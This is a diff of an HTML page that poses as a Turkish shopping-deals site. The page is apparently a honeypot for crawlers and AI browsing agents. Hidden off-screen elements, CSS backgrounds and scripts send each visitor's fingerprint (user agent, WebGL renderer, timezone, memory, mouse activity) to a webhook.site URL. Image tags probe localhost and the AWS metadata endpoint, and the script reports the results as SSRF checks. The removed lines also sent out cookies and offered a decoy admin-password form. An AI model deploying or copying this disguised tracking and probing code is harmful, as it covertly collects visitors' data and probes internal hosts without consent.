@@ -3,131 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberShopier - Özel Fırsatlar ve Admin Paneli</title>
+    <meta name="robots" content="noindex, nofollow"> <title>CyberShopier - Exclusive Deals</title>
     
-    <meta property="og:image" content="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=meta_og_image">
-    <link rel="prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=link_prefetch">
     <link rel="dns-prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=dns_prefetch">
+    <link rel="preconnect" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=preconnect">
+    <meta property="og:image" content="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=og_image_load">
 
     <style>
-        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff00; padding: 20px; }
-        .trap-box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; background: #1a1a1a; }
-        h1 { color: #ff3333; text-align: center; }
-        button, a { background: #333; color: white; padding: 10px; border: 1px solid #555; text-decoration: none; display: inline-block; margin: 5px; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; color: #333; padding: 20px; text-align: center; }
+        .container { background: white; max-width: 600px; margin: 0 auto; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #2c3e50; }
+        p { color: #7f8c8d; }
+        .btn { display: inline-block; padding: 10px 20px; background: #3498db; color: white; text-decoration: none; border-radius: 5px; margin-top: 20px; }
         
-        /* TUZAK 2: CSS Background Image (Görünmez Veri Sızdırma) */
-        .css-trap {
-            background-image: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=css_background_image');
-            width: 100%; height: 10px; display: block;
+        /* GİZLİ TUZAKLAR (İnsan görmez, Bot görür) */
+        .ghost-element {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
         }
-        
-        /* TUZAK 3: Font Yükleme */
-        @font-face {
-            font-family: 'TrapFont';
-            src: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=font_load_request');
+
+        /* Görünmez Arka Plan İsteği */
+        .bg-tracker {
+            background-image: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=css_bg_hidden');
+            width: 0; height: 0;
         }
-        .font-test { font-family: 'TrapFont', sans-serif; }
     </style>
 </head>
 <body>
 
-    <h1>⚠️ CYBERSHOPIER ADMIN & OFFER PANEL ⚠️</h1>
-    <p class="font-test">Sistem Taraması Başlatıldı... (Font Test)</p>
-    
-    <div class="css-trap"></div>
-
-    <div class="trap-box">
-        <h3>1. Medya İşleme Testi (Passive Rendering)</h3>
-        <p>Bot bu elementleri render ederse log düşecek.</p>
-        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=img_tag_visible" alt="Offer" width="50">
-        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=img_tag_hidden" style="display:none;" alt="Hidden">
-        <audio src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=audio_tag_preload" preload="auto"></audio>
+    <div class="container">
+        <h1>CyberShopier Fırsatları</h1>
+        <p>Hoş geldiniz. Size özel indirimleri görüntülemek için lütfen bekleyin veya aşağıdaki butona tıklayın.</p>
+        <a href="#" class="btn" onclick="triggerManualLog()">Fırsatları Yükle</a>
     </div>
 
-    <div class="trap-box">
-        <h3>2. Tıklama ve Gezinme Testi (Active Crawling)</h3>
-        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=simple_click_link">🎁 İndirimleri Gör (Normal Link)</a>
-        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=target_blank_click" target="_blank">📄 Sözleşmeyi Oku (Yeni Sekme)</a>
-        <a href="ftp://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=ftp_protocol">FTP Protokol Testi</a>
-    </div>
-
-    <div class="trap-box">
-        <h3>3. Form ve Veri Gönderme (Interaction)</h3>
-        <form action="https://webhook.site/ba202258-a350-476f-a68a-24a599534355" method="GET">
-            <input type="hidden" name="source" value="form_submission_get">
-            <input type="text" name="bot_check" placeholder="Admin Şifresi" value="123456">
-            <button type="submit">Giriş Yap (GET)</button>
-        </form>
-        <br>
-        <form action="https://webhook.site/ba202258-a350-476f-a68a-24a599534355" method="POST">
-            <input type="hidden" name="source" value="form_submission_post">
-            <input type="hidden" name="secret" value="super_secret_key">
-            <button type="submit">Veritabanını Yedekle (POST)</button>
-        </form>
-    </div>
-
-    <div class="trap-box">
-        <h3>4. İç Ağ (Localhost) Erişim Testi</h3>
-        <p>Bot bu iframeleri yüklerse Localhost'a erişimi var demektir.</p>
-        <iframe src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=iframe_load" width="100" height="50"></iframe>
+    <div class="ghost-element">
         
-        <img src="http://127.0.0.1:80/favicon.ico" onerror="reportSSRF('Localhost_80_Fail')" onload="reportSSRF('Localhost_80_Success')" style="display:none;">
-        <img src="http://169.254.169.254/latest/meta-data/" onerror="reportSSRF('AWS_Metadata_Fail')" onload="reportSSRF('AWS_Metadata_Success')" style="display:none;">
+        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_pixel_img" alt="">
+        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_svg_img" alt="">
+
+        <img src="http://127.0.0.1:80/favicon.ico" onerror="logSSRF('Localhost_Fail')" onload="logSSRF('Localhost_Success')">
+        <img src="http://169.254.169.254/latest/meta-data/" onerror="logSSRF('AWS_Meta_Fail')" onload="logSSRF('AWS_Meta_Success')">
+        
+        <iframe src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=iframe_deep"></iframe>
+
+        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_link_click">Admin Paneli</a>
+        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_config_file">Config.json</a>
     </div>
 
-    <div class="trap-box">
-        <h3>5. JS Motoru ve Veri Sızdırma (Blind XSS)</h3>
-        <p id="js_status">JS Analizi Bekleniyor...</p>
-        <script>
-            // HEDEF: Webhook URL
-            const WEBHOOK = "https://webhook.site/ba202258-a350-476f-a68a-24a599534355";
+    <div class="bg-tracker"></div>
 
-            function sendExfiltration(dataLabel, dataContent) {
-                // Veriyi Base64 ile şifrele ki URL bozulmasın
-                const encoded = btoa(dataContent);
-                const img = new Image();
-                img.src = `${WEBHOOK}?source=js_exfil&type=${dataLabel}&data=${encoded}`;
-            }
+    <script>
+        const WEBHOOK_URL = "https://webhook.site/ba202258-a350-476f-a68a-24a599534355";
 
-            // 1. Temel Tarayıcı Bilgileri
-            const botInfo = `UA:${navigator.userAgent} | Platform:${navigator.platform} | Cookies:${document.cookie} | Screen:${screen.width}x${screen.height}`;
-            sendExfiltration("BrowserInfo", botInfo);
+        // Veri Gönderme Fonksiyonu (Base64 Encode ile)
+        function sendLog(type, data) {
+            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+            // URL uzunluğunu aşmamak için fetch yerine Image objesi kullanalım (Daha sessizdir)
+            new Image().src = `${WEBHOOK_URL}?source=js_tracker&type=${type}&payload=${encodedData}`;
+        }
 
-            // 2. Localhost SSRF Raporlama Fonksiyonu
-            function reportSSRF(status) {
-                const img = new Image();
-                img.src = `${WEBHOOK}?source=ssrf_probe&status=${status}`;
-            }
+        // 1. SSRF Durumunu Raporla
+        function logSSRF(status) {
+            new Image().src = `${WEBHOOK_URL}?source=ssrf_check&status=${status}`;
+        }
 
-            // 3. Canvas Fingerprinting (Botu benzersiz şekilde tanımak için)
+        // 2. Kapsamlı Parmak İzi (Fingerprinting)
+        function collectFingerprint() {
+            const fp = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown', // CPU Çekirdek
+                deviceMemory: navigator.deviceMemory || 'unknown', // RAM (GB)
+                screenRes: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                historyLen: history.length
+            };
+            sendLog('AdvancedFingerprint', fp);
+        }
+
+        // 3. WebGL Bilgisi (Ekran Kartı - Bot mu Gerçek mi ayrımı için kritiktir)
+        function getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.textBaseline = "alphabetic";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Grok_Trap_v1", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Grok_Trap_v1", 4, 17);
-                const dataURL = canvas.toDataURL();
-                // Sadece hash'i gönder (URL çok uzamasın)
-                let hash = 0;
-                for (let i = 0; i < dataURL.length; i++) {
-                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
-                    hash |= 0;
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    sendLog('WebGL', { vendor: vendor, renderer: renderer });
                 }
-                sendExfiltration("CanvasFingerprint", hash.toString());
-            } catch (e) {
-                sendExfiltration("CanvasError", e.message);
-            }
+            } catch(e) { /* Hata olursa sessiz kal */ }
+        }
 
-            document.getElementById('js_status').innerText = "JS Verileri Gönderildi! (Eğer botsan yakalandın)";
-            console.log("Trap executed.");
-        </script>
-    </div>
+        // 4. Etkileşim Takibi (Bot fare kullanıyor mu?)
+        let interactionSent = false;
+        function trackInteraction() {
+            if (!interactionSent) {
+                sendLog('UserInteraction', { type: 'MouseMove/Touch' });
+                interactionSent = true;
+                // Event listenerları kaldır ki spam olmasın
+                document.removeEventListener('mousemove', trackInteraction);
+                document.removeEventListener('touchstart', trackInteraction);
+            }
+        }
+        
+        // Manuel Buton Tetikleyicisi
+        function triggerManualLog() {
+            sendLog('ManualClick', { btn: 'Fırsatları Yükle' });
+            alert('Yükleniyor...'); // Botu oyalamak için
+        }
+
+        // --- BAŞLATMA ---
+        window.onload = function() {
+            collectFingerprint();
+            getWebGLInfo();
+            // Fare hareketlerini dinle
+            document.addEventListener('mousemove', trackInteraction);
+            document.addEventListener('touchstart', trackInteraction);
+        };
+    </script>
 
 </body>
 </html>
